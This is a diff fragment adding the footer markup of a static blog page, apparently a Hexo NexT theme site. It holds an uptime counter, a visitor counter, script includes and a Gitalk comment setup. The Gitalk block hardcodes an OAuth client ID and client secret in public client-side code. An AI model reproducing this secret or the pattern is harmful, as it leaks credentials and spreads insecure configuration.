+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
